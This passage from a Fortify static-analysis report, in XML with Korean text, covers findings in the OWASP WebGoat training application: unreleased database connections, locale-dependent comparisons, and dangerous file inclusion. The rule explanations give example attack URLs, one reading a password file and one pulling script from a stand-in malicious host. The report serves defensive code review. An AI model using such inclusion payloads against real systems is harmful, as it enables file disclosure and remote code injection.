<LineStart>280</LineStart>
<Snippet>	    }
	    PreparedStatement ps = connection
		    .prepareStatement("SELECT * FROM user_data WHERE userid = ?");
	    ps.setInt(1, id);
	    try</Snippet>
<TargetFunction>ps = connection.prepareStatement(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="82D70BA5E84D0C9D4F5969FFB9E2BB82" ruleID="B7DFF4A8-9817-4418-A35B-E70D10DC825E">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>WsSqlInjection.java의 getResults() 함수는 229 줄의 &lt;a href="location://JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java###82###5###0"&gt;makeConnection()&lt;/a&gt;에 의해 할당된 데이터베이스 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>WsSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSqlInjection.java</FilePath>
<LineStart>229</LineStart>
<Snippet>	try
	{
	    Connection connection = DatabaseUtilities.makeConnection();
	    if (connection == null)
	    {</Snippet>
<TargetFunction>connection = makeConnection()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9576E5DBC7ACCBD5458D476D6C15BAB3" ruleID="EC71C442-6E66-45DF-9890-41A5156B1CD0">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CreateDB.java의 main() 함수는 70 줄의 getConnection()에 의해 할당된 데이터베이스 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>CreateDB.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/CreateDB.java</FilePath>
<LineStart>88</LineStart>
<Snippet>	try
	{
	    Statement answer_statement = connection.createStatement(
		    ResultSet.TYPE_SCROLL_INSENSITIVE,
		    ResultSet.CONCUR_READ_ONLY);</Snippet>
<TargetFunction>answer_statement = connection.createStatement(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E7F8B28D8CC84CC72A21B3CB2B606909" ruleID="EC71C442-6E66-45DF-9890-41A5156B1CD0">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CreateDB.java의 main() 함수는 70 줄의 getConnection()에 의해 할당된 데이터베이스 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>CreateDB.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/CreateDB.java</FilePath>
<LineStart>73</LineStart>
<Snippet>			    "jdbc:odbc:;DRIVER=Microsoft Access Driver (*.mdb);DBQ=c:/webgoat.mdb;PWD=webgoat",
			    "webgoat", "webgoat");
	    db.makeDB(connection);
	}
	catch (Exception e)</Snippet>
<TargetFunction>?.makeDB(connection)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="CDAFF78604806F2C9413943C8A3A691B" ruleID="789BB115-AAF5-4C03-BBC2-C4CFCC74C13A">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>WsSqlInjection.java의 getResults() 함수는 229 줄의 &lt;a href="location://JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java###82###5###0"&gt;makeConnection()&lt;/a&gt;에 의해 할당된 데이터베이스 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>WsSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSqlInjection.java</FilePath>
<LineStart>240</LineStart>
<Snippet>			ResultSet.TYPE_SCROLL_INSENSITIVE,
			ResultSet.CONCUR_READ_ONLY);
		ResultSet results = statement.executeQuery(query);
		return results;
	    }</Snippet>
<TargetFunction>results = statement.executeQuery(...)</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="11">
                        <groupTitle>Portability Flaw: Locale Dependent Comparison</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>91 줄의 equals() 호출은 다른 로케일을 포함하기 때문에 예기치 않은 출력이 생성될 수 있으므로 이식성 문제를 일으킵니다. 또한 이 호출은 사용자 지정 검증 루틴을 우회할 수도 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>로케일에 따라 달라질 수 있는 데이터를 비교할 때는 적절한 로케일을 지정해야 합니다.

예제 1: 다음 예제에서는 검증 수행을 시도하여 사용자 입력에 &lt;script&gt; 태그가 포함되어 있는지 확인합니다.

  ...
  public String tagProcessor(String tag){
    if (tag.toUpperCase().equals("SCRIPT")){
      return null;
    }
    //does not contain SCRIPT tag, keep processing input
    ...
  }
  ...


Example 1의 문제는 java.lang.String.toUpperCase()를 로케일 없이 사용하는 경우 기본 로케일의 규칙이 사용된다는 점입니다. 터키어 로케일 "title".toUpperCase()를 사용하는 경우 “T\u0130TLE”가 반환되며, 여기서 “\u0130”은 “위에 점이 있는 라틴어 대문자” 문자입니다. 이로 인해 예기치 않은 결과가 발생할 수 있습니다. 예를 들어 Example 1에서는 이 코드를 사용하면 “script” 단어가 이 검증에서 catch되지 않아 Cross-Site Scripting 취약점이 발생할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>이러한 문제가 발생하지 않도록 하려면 항상 기본 로케일을 지정하거나, 로케일을 허용하는 toUpperCase() 등의 API를 사용하여 로케일을 지정합니다. 

예제 2: 다음 예제에서는 로케일을 toUpperCase()에 대한 인수로 수동 지정합니다.


import java.util.Locale;
  ...
  public String tagProcessor(String tag){
    if (tag.toUpperCase(Locale.ENGLISH).equals("SCRIPT")){
      return null;
    }
    //does not contain SCRIPT tag, keep processing input
    ...
  }
  ...


예제 3: 다음 예제에서는 이 문제를 방지하기 위해 함수 java.lang.String.equalsIgnoreCase() API를 사용합니다.


  ...
  public String tagProcessor(String tag){
    if (tag.equalsIgnoreCase("SCRIPT")){
      return null;
    }
    //does not contain SCRIPT tag, keep processing input
    ...
  }
  ...


이 코드를 사용하는 경우 equalsIgnoreCase()가 Character.toLowerCase() 및 Character.toUpperCase()와 비슷하게 대/소문자를 변경하므로 문제가 발생하지 않습니다. 이때 유니코드 협회(Unicode Consortium)에서 유지 관리하는 유니코드 문자 데이터베이스의 일부인 UnicodeData 파일의 정보를 사용하여 두 문자열의 임시 정규형을 만듭니다. 그러면 해당 문자열을 읽으려 할 때 읽지 못하게 될 수도 있지만, 로케일을 사용하지 않아도 비교는 할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Fortify Static Code Analyzer는 응용 프로그램 내 임의의 위치에서 java.util.Locale.setDefault()가 호출되었음을 확인하면 로케일이 그에 따라 설정되었다고 가정하므로 이러한 문제도 표시되지 않습니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>11</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="3C4A3131050CC60B27940AB38957D2CC" ruleID="D8E9ED3B-22EC-4CBA-98C8-7C67F73CCF4C">
                            <Category>Portability Flaw: Locale Dependent Comparison</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>100 줄의 equals() 호출은 다른 로케일을 포함하기 때문에 예기치 않은 출력이 생성될 수 있으므로 이식성 문제를 일으킵니다. 또한 이 호출은 사용자 지정 검증 루틴을 우회할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>100</LineStart>
<Snippet>				.toLowerCase().equals("ifconfig") || helpFile
			.substring(index, helpFileLen).trim().toLowerCase()
			.equals("ipconfig")))
			|| (helpFile.substring(index, helpFileLen).trim()
				.toLowerCase().equals("netstat -a #")</Snippet>
<TargetFunction>helpFile.substring(index, helpFileLen).trim().toLowerCase().equals(...) : Comparison without checking locale()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7A4F663B47CF248531452655594A697E" ruleID="D8E9ED3B-22EC-4CBA-98C8-7C67F73CCF4C">
                            <Category>Portability Flaw: Locale Dependent Comparison</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>113 줄의 equals() 호출은 다른 로케일을 포함하기 때문에 예기치 않은 출력이 생성될 수 있으므로 이식성 문제를 일으킵니다. 또한 이 호출은 사용자 지정 검증 루틴을 우회할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>113</LineStart>
<Snippet>						"ifconfig #") || helpFile
				.substring(index, helpFileLen).trim()
				.toLowerCase().equals("ipconfig #")))
		{
		    illegalCommand = false;</Snippet>
<TargetFunction>helpFile.substring(index, helpFileLen).trim().toLowerCase().equals(...) : Comparison without checking locale()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7BBF44F9C54BFA46F2DB455FDAA99218" ruleID="D8E9ED3B-22EC-4CBA-98C8-7C67F73CCF4C">
                            <Category>Portability Flaw: Locale Dependent Comparison</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>96 줄의 equals() 호출은 다른 로케일을 포함하기 때문에 예기치 않은 출력이 생성될 수 있으므로 이식성 문제를 일으킵니다. 또한 이 호출은 사용자 지정 검증 루틴을 우회할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>96</LineStart>
<Snippet>				.toLowerCase().equals("dir")
			|| helpFile.substring(index, helpFileLen).trim()
				.toLowerCase().equals("ls")
			|| helpFile.substring(index, helpFileLen).trim()
				.toLowerCase().equals("ifconfig") || helpFile</Snippet>
<TargetFunction>helpFile.substring(index, helpFileLen).trim().toLowerCase().equals(...) : Comparison without checking locale()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="21D6A59D3A5B3773B565C8A068A6F786" ruleID="D8E9ED3B-22EC-4CBA-98C8-7C67F73CCF4C">
                            <Category>Portability Flaw: Locale Dependent Comparison</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>108 줄의 equals() 호출은 다른 로케일을 포함하기 때문에 예기치 않은 출력이 생성될 수 있으므로 이식성 문제를 일으킵니다. 또한 이 호출은 사용자 지정 검증 루틴을 우회할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>108</LineStart>
<Snippet>					.trim().toLowerCase().equals("ls #")
				|| helpFile.substring(index, helpFileLen)
					.trim().toLowerCase().equals("ls -l #")
				|| helpFile.substring(index, helpFileLen)
					.trim().toLowerCase().equals(</Snippet>
<TargetFunction>helpFile.substring(index, helpFileLen).trim().toLowerCase().equals(...) : Comparison without checking locale()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0C15CFDBC9593186412491D1E413DD37" ruleID="D8E9ED3B-22EC-4CBA-98C8-7C67F73CCF4C">
                            <Category>Portability Flaw: Locale Dependent Comparison</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>98 줄의 equals() 호출은 다른 로케일을 포함하기 때문에 예기치 않은 출력이 생성될 수 있으므로 이식성 문제를 일으킵니다. 또한 이 호출은 사용자 지정 검증 루틴을 우회할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>98</LineStart>
<Snippet>				.toLowerCase().equals("ls")
			|| helpFile.substring(index, helpFileLen).trim()
				.toLowerCase().equals("ifconfig") || helpFile
			.substring(index, helpFileLen).trim().toLowerCase()
			.equals("ipconfig")))</Snippet>
<TargetFunction>helpFile.substring(index, helpFileLen).trim().toLowerCase().equals(...) : Comparison without checking locale()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C10CC80219E23586F49B56A09EFD5C8A" ruleID="D8E9ED3B-22EC-4CBA-98C8-7C67F73CCF4C">
                            <Category>Portability Flaw: Locale Dependent Comparison</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>106 줄의 equals() 호출은 다른 로케일을 포함하기 때문에 예기치 않은 출력이 생성될 수 있으므로 이식성 문제를 일으킵니다. 또한 이 호출은 사용자 지정 검증 루틴을 우회할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>106</LineStart>
<Snippet>					.trim().toLowerCase().equals("dir #")
				|| helpFile.substring(index, helpFileLen)
					.trim().toLowerCase().equals("ls #")
				|| helpFile.substring(index, helpFileLen)
					.trim().toLowerCase().equals("ls -l #")</Snippet>
<TargetFunction>helpFile.substring(index, helpFileLen).trim().toLowerCase().equals(...) : Comparison without checking locale()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B2F935DB9D9101F2007981595EFE39FA" ruleID="D8E9ED3B-22EC-4CBA-98C8-7C67F73CCF4C">
                            <Category>Portability Flaw: Locale Dependent Comparison</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>91 줄의 equals() 호출은 다른 로케일을 포함하기 때문에 예기치 않은 출력이 생성될 수 있으므로 이식성 문제를 일으킵니다. 또한 이 호출은 사용자 지정 검증 루틴을 우회할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>91</LineStart>
<Snippet>				.toLowerCase() + "]");
		if ((osName.indexOf("Windows") != -1 &amp;&amp; (helpFile.substring(
			index, helpFileLen).trim().toLowerCase().equals(
			"netstat -a")
			|| helpFile.substring(index, helpFileLen).trim()</Snippet>
<TargetFunction>helpFile.substring(index, helpFileLen).trim().toLowerCase().equals(...) : Comparison without checking locale()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="06BCAF8544560127282453F54A6C02F8" ruleID="D8E9ED3B-22EC-4CBA-98C8-7C67F73CCF4C">
                            <Category>Portability Flaw: Locale Dependent Comparison</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>102 줄의 equals() 호출은 다른 로케일을 포함하기 때문에 예기치 않은 출력이 생성될 수 있으므로 이식성 문제를 일으킵니다. 또한 이 호출은 사용자 지정 검증 루틴을 우회할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>102</LineStart>
<Snippet>			.equals("ipconfig")))
			|| (helpFile.substring(index, helpFileLen).trim()
				.toLowerCase().equals("netstat -a #")
				|| helpFile.substring(index, helpFileLen)
					.trim().toLowerCase().equals("dir #")</Snippet>
<TargetFunction>helpFile.substring(index, helpFileLen).trim().toLowerCase().equals(...) : Comparison without checking locale()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5BDD633E9F9464E5B57B5CA0175FE7BA" ruleID="D8E9ED3B-22EC-4CBA-98C8-7C67F73CCF4C">
                            <Category>Portability Flaw: Locale Dependent Comparison</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>110 줄의 equals() 호출은 다른 로케일을 포함하기 때문에 예기치 않은 출력이 생성될 수 있으므로 이식성 문제를 일으킵니다. 또한 이 호출은 사용자 지정 검증 루틴을 우회할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>110</LineStart>
<Snippet>					.trim().toLowerCase().equals("ls -l #")
				|| helpFile.substring(index, helpFileLen)
					.trim().toLowerCase().equals(
						"ifconfig #") || helpFile
				.substring(index, helpFileLen).trim()</Snippet>
<TargetFunction>helpFile.substring(index, helpFileLen).trim().toLowerCase().equals(...) : Comparison without checking locale()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="62A16B93EBE18142F72A9429F72F8D1D" ruleID="D8E9ED3B-22EC-4CBA-98C8-7C67F73CCF4C">
                            <Category>Portability Flaw: Locale Dependent Comparison</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>104 줄의 equals() 호출은 다른 로케일을 포함하기 때문에 예기치 않은 출력이 생성될 수 있으므로 이식성 문제를 일으킵니다. 또한 이 호출은 사용자 지정 검증 루틴을 우회할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>104</LineStart>
<Snippet>				.toLowerCase().equals("netstat -a #")
				|| helpFile.substring(index, helpFileLen)
					.trim().toLowerCase().equals("dir #")
				|| helpFile.substring(index, helpFileLen)
					.trim().toLowerCase().equals("ls #")</Snippet>
<TargetFunction>helpFile.substring(index, helpFileLen).trim().toLowerCase().equals(...) : Comparison without checking locale()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0C44CD5BB5361DB96E12E36594AA4CF1" ruleID="D8E9ED3B-22EC-4CBA-98C8-7C67F73CCF4C">
                            <Category>Portability Flaw: Locale Dependent Comparison</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>94 줄의 equals() 호출은 다른 로케일을 포함하기 때문에 예기치 않은 출력이 생성될 수 있으므로 이식성 문제를 일으킵니다. 또한 이 호출은 사용자 지정 검증 루틴을 우회할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>94</LineStart>
<Snippet>			"netstat -a")
			|| helpFile.substring(index, helpFileLen).trim()
				.toLowerCase().equals("dir")
			|| helpFile.substring(index, helpFileLen).trim()
				.toLowerCase().equals("ls")</Snippet>
<TargetFunction>helpFile.substring(index, helpFileLen).trim().toLowerCase().equals(...) : Comparison without checking locale()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="9">
                        <groupTitle>Dangerous File Inclusion</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>CrossSiteScripting.jsp 파일은 20 줄의 동적 include 문에 확인되지 않은 파일 이름을 전달합니다. 확인되지 않은 사용자 입력이 JSP에 동적으로 포함되는 파일을 제어하면 악성 코드가 실행될 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>많은 최신 웹 스크립팅 언어는 하나의 캡슐화 파일 내에 추가 소스 파일을 포함하는 기능을 통해 코드 재사용 및 모듈화를 가능하게 합니다. 이 기능은 표준 모양 및 느낌을 응용 프로그램에 적용하거나(템플레이팅) 컴파일된 코드를 필요로 하지 않고 함수를 공유하거나 코드를 더 작은 관리하기 쉬운 파일로 분할하는 데 주로 사용됩니다. 포함된 파일은 상위 파일의 일부로 해석되고 같은 방법으로 실행됩니다. File inclusion 취약점은 포함된 파일의 경로가 확인되지 않은 사용자 입력에 의해 제어될 때 발생합니다. 


예제 1: 다음은 Local File Inclusion 취약점의 예입니다. 샘플 코드는 사용자 지정 템플릿 이름을 사용하고 렌더링할 JSP 페이지에 포함시킵니다.

...
&lt;jsp:include page="&lt;%= (String)request.getParameter(\"template\")%&gt;"&gt;
...

공격자가 동적 include 문에 올바른 파일을 지정하면 해당 파일의 내용이 페이지에 렌더링되도록 JSP 인터프리터에 전달됩니다.

vector of the form 공격이 발생하는 경우,

specialpage.jsp?template=/WEB-INF/database/passwordDB

JSP 인터프리터는 /WEB-INF/database/passwordDB 파일의 내용을 JSP 페이지에 렌더링하여 시스템 보안을 손상시킵니다.

심지어 공격자가 자신이 제어하는 원격 사이트의 경로를 지정할 수 있는 경우에는 동적 include 문이 공격자가 제공한 임의의 악성 코드를 실행하게 됩니다.

예제 2: 샘플 코드는 c:import 태그를 사용하여 사용자 지정된 원격 파일을 현재 JSP 페이지로 가져옵니다.

...
&lt;c:import url="&lt;%= request.getParameter("privacy")%&gt;"&gt;
...

vector of the form 공격은

policy.jsp?privacy=http://www.malicioushost.com/attackdata.js

공격자가 제어하는 원격 사이트에서 현재 JSP 페이지로 악성 코드를 삽입할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>확인되지 않은 사용자 입력이 동적 include 문에서 사용된 경로를 제어하도록 허용하지 마십시오. 대신, 다음과 같은 간접 참조를 사용합니다. 즉, 포함할 올바른 파일 목록을 만들어 사용자가 목록에서 선택하는 것만 허용하는 것입니다.  이 방법을 사용하면 사용자가 파일 시스템에서 파일을 직접 지정할 수 없습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 많은 최신 웹 프레임워크는 사용자 입력의 검증을 수행하기 위한 메커니즘을 제공합니다(Struts 및 Spring MVC 포함). 확인되지 않은 입력의 소스를 강조하기 위해, Fortify 보안 코딩 규칙 팩은 악용 가능성을 낮추고 프레임워크 검증 메커니즘이 사용 중일 때마다 지원하는 증거에 포인터를 제공하여 Fortify Static Code Analyzer에서 보고한 문제의 우선 순위를 동적으로 재지정합니다. 이 기능을 Context-Sensitive Ranking(컨텍스트 감지 순위)이라고 부릅니다. Fortify 사용자의 감사 프로세스를 지원하기 위해, Fortify Software Security Research Group은 입력 소스에 적용된 검증 메커니즘에 따라 문제를 폴더로 그룹화하는 데이터 유효성 프로젝트 템플릿을 사용 가능하게 만듭니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>9</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="B958A729EAD576D0DDE8ADAA8C934372" ruleID="A4DB6C61-8D89-454D-903F-9F82173E09880">
                            <Category>Dangerous File Inclusion</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>SQLInjection.jsp 파일은 20 줄의 동적 include 문에 확인되지 않은 파일 이름을 전달합니다. 확인되지 않은 사용자 입력이 JSP에 동적으로 포함되는 파일을 제어하면 악성 코드가 실행될 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>SQLInjection.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/SQLInjection.jsp</FilePath>
<LineStart>20</LineStart>
<Snippet>		//System.out.println("Including sub view page: " + subViewPage);
	%&gt;
	&lt;jsp:include page="&lt;%=subViewPage%&gt;" /&gt;
	&lt;%
	}</Snippet>
<TargetFunction>http://java.sun.com/JSP/Page/include/_jspService()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EAAB6743780BC0DB9A326BBFEF4CED24" ruleID="6E4F370A-5DB4-4A3E-8CAC-C691A9DE449A0">
                            <Category>Dangerous File Inclusion</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>CrossSiteScripting.jsp 파일은 20 줄의 동적 include 문에 확인되지 않은 파일 이름을 전달합니다. 확인되지 않은 사용자 입력이 JSP에 동적으로 포함되는 파일을 제어하면 악성 코드가 실행될 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>CrossSiteScripting.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/CrossSiteScripting.jsp</FilePath>
<LineStart>20</LineStart>
<Snippet>		//System.out.println("Including sub view page: " + subViewPage);
	%&gt;
	&lt;jsp:include page="&lt;%=subViewPage%&gt;" /&gt;
	&lt;%
	}</Snippet>
<TargetFunction>http://java.sun.com/JSP/Page/include/_jspService()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="77383DB805CE18C04C45E33136E97774" ruleID="6E4F370A-5DB4-4A3E-8CAC-C691A9DE449A0">
                            <Category>Dangerous File Inclusion</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>RoleBasedAccessControl.jsp 파일은 20 줄의 동적 include 문에 확인되지 않은 파일 이름을 전달합니다. 확인되지 않은 사용자 입력이 JSP에 동적으로 포함되는 파일을 제어하면 악성 코드가 실행될 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/RoleBasedAccessControl.jsp</FilePath>
<LineStart>20</LineStart>
<Snippet>		//System.out.println("Including sub view page: " + subViewPage);
	%&gt;
	&lt;jsp:include page="&lt;%=subViewPage%&gt;" /&gt;
	&lt;%
	}</Snippet>
<TargetFunction>http://java.sun.com/JSP/Page/include/_jspService()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5F2144D0EF13262BD9F9038477396D61" ruleID="6E4F370A-5DB4-4A3E-8CAC-C691A9DE449A0">
                            <Category>Dangerous File Inclusion</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>SQLInjection.jsp 파일은 20 줄의 동적 include 문에 확인되지 않은 파일 이름을 전달합니다. 확인되지 않은 사용자 입력이 JSP에 동적으로 포함되는 파일을 제어하면 악성 코드가 실행될 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>SQLInjection.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/SQLInjection.jsp</FilePath>
<LineStart>20</LineStart>
<Snippet>		//System.out.println("Including sub view page: " + subViewPage);
	%&gt;
	&lt;jsp:include page="&lt;%=subViewPage%&gt;" /&gt;
	&lt;%
	}</Snippet>
<TargetFunction>http://java.sun.com/JSP/Page/include/_jspService()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D97018403909B589EFEE771A24B07820" ruleID="6E4F370A-5DB4-4A3E-8CAC-C691A9DE449A0">
